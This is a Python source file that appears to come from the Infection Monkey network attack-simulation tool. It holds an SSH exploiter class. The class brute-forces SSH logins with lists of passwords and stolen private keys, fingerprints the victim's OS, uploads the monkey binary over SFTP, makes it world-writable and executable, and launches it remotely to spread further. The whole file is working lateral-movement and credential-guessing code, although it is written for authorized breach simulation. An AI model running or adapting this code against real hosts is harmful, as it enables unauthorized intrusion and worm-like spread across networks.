import io
import logging
import time

import paramiko

import infection_monkey.monkeyfs as monkeyfs
from infection_monkey.exploit import HostExploiter
from infection_monkey.exploit.tools.helpers import get_target_monkey, get_monkey_depth, build_monkey_commandline
from infection_monkey.exploit.tools.helpers import get_interface_to_target
from infection_monkey.model import MONKEY_ARG
from infection_monkey.exploit.tools.exceptions import FailedExploitationError
from infection_monkey.network.tools import check_tcp_port
from common.utils.exploit_enum import ExploitType
from common.utils.attack_utils import ScanStatus
from infection_monkey.telemetry.attack.t1105_telem import T1105Telem
from infection_monkey.telemetry.attack.t1222_telem import T1222Telem

__author__ = 'hoffer'

LOG = logging.getLogger(__name__)
SSH_PORT = 22
TRANSFER_UPDATE_RATE = 15


class SSHExploiter(HostExploiter):
    _TARGET_OS_TYPE = ['linux', None]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = 'SSH'

    def __init__(self, host):
        super(SSHExploiter, self).__init__(host)
        self._update_timestamp = 0
        self.skip_exist = self._config.skip_exploit_if_file_exist

    def log_transfer(self, transferred, total):
        if time.time() - self._update_timestamp > TRANSFER_UPDATE_RATE:
            LOG.debug("SFTP transferred: %d bytes, total: %d bytes", transferred, total)
            self._update_timestamp = time.time()

    def exploit_with_ssh_keys(self, port) -> paramiko.SSHClient:
        user_ssh_key_pairs = self._config.get_exploit_user_ssh_key_pairs()

        for user, ssh_key_pair in user_ssh_key_pairs:
            # Creating file-like private key for paramiko
            pkey = io.StringIO(ssh_key_pair['private_key'])
            ssh_string = "%s@%s" % (ssh_key_pair['user'], ssh_key_pair['ip'])

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            try:
                pkey = paramiko.RSAKey.from_private_key(pkey)
            except(IOError, paramiko.SSHException, paramiko.PasswordRequiredException):
                LOG.error("Failed reading ssh key")
            try:
                ssh.connect(self.host.ip_addr,
                            username=user,
                            pkey=pkey,
                            port=port)
                LOG.debug("Successfully logged in %s using %s users private key",
                          self.host, ssh_string)
                self.report_login_attempt(True, user, ssh_key=ssh_string)
                return ssh
            except Exception:
                ssh.close()
                LOG.debug("Error logging into victim %r with %s"
                          " private key", self.host,
                          ssh_string)
                self.report_login_attempt(False, user, ssh_key=ssh_string)
                continue
        raise FailedExploitationError

    def exploit_with_login_creds(self, port) -> paramiko.SSHClient:
        user_password_pairs = self._config.get_exploit_user_password_pairs()

        for user, current_password in user_password_pairs:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            try:
                ssh.connect(self.host.ip_addr,
                            username=user,
                            password=current_password,
                            port=port)

                LOG.debug("Successfully logged in %r using SSH. User: %s, pass (SHA-512): %s)",
                          self.host, user, self._config.hash_sensitive_data(current_password))
                self.add_vuln_port(port)
                self.report_login_attempt(True, user, current_password)
                return ssh

            except Exception as exc:
                LOG.debug("Error logging into victim %r with user"
                          " %s and password (SHA-512) '%s': (%s)", self.host,
                          user, self._config.hash_sensitive_data(current_password), exc)
                self.report_login_attempt(False, user, current_password)
                ssh.close()
                continue
        raise FailedExploitationError

    def _exploit_host(self):

        port = SSH_PORT
        # if ssh banner found on different port, use that port.
        for servkey, servdata in list(self.host.services.items()):
            if servdata.get('name') == 'ssh' and servkey.startswith('tcp-'):
                port = int(servkey.replace('tcp-', ''))

        is_open, _ = check_tcp_port(self.host.ip_addr, port)
        if not is_open:
            LOG.info("SSH port is closed on %r, skipping", self.host)
            return False

        try:
            ssh = self.exploit_with_ssh_keys(port)
        except FailedExploitationError:
            try:
                ssh = self.exploit_with_login_creds(port)
            except FailedExploitationError:
                LOG.debug("Exploiter SSHExploiter is giving up...")
                return False

        if not self.host.os.get('type'):
            try:
                _, stdout, _ = ssh.exec_command('uname -o')
                uname_os = stdout.read().lower().strip().decode()
                if 'linux' in uname_os:
                    self.host.os['type'] = 'linux'
                else:
                    LOG.info("SSH Skipping unknown os: %s", uname_os)
                    return False
            except Exception as exc:
                LOG.debug("Error running uname os commad on victim %r: (%s)", self.host, exc)
                return False

        if not self.host.os.get('machine'):
            try:
                _, stdout, _ = ssh.exec_command('uname -m')
                uname_machine = stdout.read().lower().strip().decode()
                if '' != uname_machine:
                    self.host.os['machine'] = uname_machine
            except Exception as exc:
                LOG.debug("Error running uname machine commad on victim %r: (%s)", self.host, exc)

        if self.skip_exist:
            _, stdout, stderr = ssh.exec_command("head -c 1 %s" % self._config.dropper_target_path_linux)
            stdout_res = stdout.read().strip()
            if stdout_res:
                # file exists
                LOG.info("Host %s was already infected under the current configuration, done" % self.host)
                return True  # return already infected

        src_path = get_target_monkey(self.host)

        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        try:
            ftp = ssh.open_sftp()

            self._update_timestamp = time.time()
            with monkeyfs.open(src_path) as file_obj:
                ftp.putfo(file_obj, self._config.dropper_target_path_linux, file_size=monkeyfs.getsize(src_path),
                          callback=self.log_transfer)
                ftp.chmod(self._config.dropper_target_path_linux, 0o777)
                status = ScanStatus.USED
                T1222Telem(ScanStatus.USED, "chmod 0777 %s" % self._config.dropper_target_path_linux, self.host).send()
            ftp.close()
        except Exception as exc:
            LOG.debug("Error uploading file into victim %r: (%s)", self.host, exc)
            status = ScanStatus.SCANNED

        T1105Telem(status,
                   get_interface_to_target(self.host.ip_addr),
                   self.host.ip_addr,
                   src_path).send()
        if status == ScanStatus.SCANNED:
            return False

        try:
            cmdline = "%s %s" % (self._config.dropper_target_path_linux, MONKEY_ARG)
            cmdline += build_monkey_commandline(self.host, get_monkey_depth() - 1)
            cmdline += "&"
            ssh.exec_command(cmdline)

            LOG.info("Executed monkey '%s' on remote victim %r (cmdline=%r)",
                     self._config.dropper_target_path_linux, self.host, cmdline)

            ssh.close()
            self.add_executed_cmd(cmdline)
            return True

        except Exception as exc:
            LOG.debug("Error running monkey on victim %r: (%s)", self.host, exc)
            return False
